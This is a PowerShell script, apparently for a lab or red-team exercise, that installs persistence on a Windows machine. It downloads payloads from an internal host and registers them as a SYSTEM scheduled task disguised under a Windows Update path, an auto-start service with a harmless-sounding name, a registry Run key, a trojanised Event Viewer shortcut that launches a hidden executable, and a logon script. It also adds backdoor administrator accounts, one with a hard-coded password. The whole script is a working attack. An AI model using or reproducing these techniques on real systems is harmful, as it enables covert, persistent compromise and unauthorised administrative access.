# Create a directory for the scripts and payloads
New-Item -Path "C:\Program Files\" -Name "Application Support" -ItemType "Directory"

# Base script path and user
$scriptAndPayloadLocation = "C:\Program Files\Application Support"
$baseUrl = "http://mastervm03:9000"
$user = $Env:UserName

# Scheduled task
$taskScriptPath = "$scriptAndPayloadLocation\syshealthcheck.ps1"
Invoke-WebRequest -Uri "$baseUrl/syshealthcheck.ps1" -OutFile $taskScriptPath # Download the script
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$taskScriptPath`""
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
$taskSettings = New-ScheduledTaskSettingsSet
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
$taskObject = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $taskTrigger -Settings $taskSettings
$taskName = "System Health Check"
$taskPath = "\Microsoft\Windows\WindowsUpdate\"
Register-ScheduledTask -TaskName $taskName -InputObject $taskObject -TaskPath $taskPath

# Service
$destination = "C:\Program Files\Application Support\AppSupportService.zip"
$extractPath = "C:\Program Files\Application Support\AppSupportService"

if (-not (Test-Path -Path (Split-Path -Path $destination -Parent))) { # Create the destination folder if it doesn't exist
    New-Item -ItemType Directory -Path (Split-Path -Path $destination -Parent)
}

Invoke-WebRequest -Uri "$baseUrl/AppSupportService.zip" -OutFile $destination # Download the .zip file
Expand-Archive -Path $destination -DestinationPath $extractPath # Unzip the file
Remove-Item -Path $destination # Delete the .zip file

New-Item -Path "C:\Program Files\Application Support\AppSupportService\" -Name "logs" -ItemType "Directory"
$params = @{
    Name = "Application Support Service"
    BinaryPathName = "$scriptAndPayloadLocation\AppSupportService\appsupportservice.exe"
    DisplayName = "Application Support Service"
    StartupType = "Automatic"
    Description = "Provides essential support and maintenance for installed applications to ensure smooth operation."
}
New-Service @params
sc.exe config $params.DisplayName obj= LocalSystem # Run as SYSTEM
Start-Service -Name $params.DisplayName

# Registry run key (User, use HKLM for computer)
$runkeyName = "Application Performance Monitor"
$runkeyValue = "$scriptAndPayloadLocation\appperfmonitor.exe"
Invoke-WebRequest -Uri "$baseUrl/appperfmonitor.exe" -OutFile $runkeyValue # Download the script
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runkeyName  -Value $runkeyValue -PropertyType "String"

# Modified .lnk file (Shortcut)
$shellObject = New-Object -ComObject WScript.Shell
$shortcut = $shellObject.CreateShortcut("C:\Users\$user\Desktop\Event Viewer.lnk")
$shortcutScriptPath = "$scriptAndPayloadLocation\loghandler.exe"
Invoke-WebRequest -Uri "$baseUrl/loghandler.exe" -OutFile $shortcutScriptPath # Download the script
$arguments = "-WindowStyle Hidden -Command `"Start-Process -FilePath '$scriptAndPayloadLocation\loghandler.exe'; invoke-item %windir%\system32\eventvwr.exe`""
$iconLocation = "%windir%\system32\eventvwr.exe"
$shortcut.TargetPath = "%windir%\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Arguments = $arguments
$shortcut.IconLocation = $iconLocation
$shortcut.WorkingDirectory = $scriptAndPayloadLocation 
$shortcut.Save()

# Add a regular account to the administrators group
$existingUsername = "lunhar"
Add-LocalGroupMember -Group Administrators -Member $existingUsername

# Create a new administrator account
$newUsername = "ethree"
$newFullName = "Ethan Reed"
$password = "Securepassword!23" | ConvertTo-SecureString -AsPlainText -Force
New-LocalUser -FullName $newFullName -Name $newUsername -AccountNeverExpires -PasswordNeverExpires -Password $password
Add-LocalGroupMember -Group Administrators -Member $newUsername

# Persistence in UserInitLogonScript
$logonScriptPath = "$scriptAndPayloadLocation\init.exe"
Invoke-WebRequest -Uri "$baseUrl/init.exe" -OutFile $logonScriptPath # Download the script
New-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value $logonScriptPath  -PropertyType "String"
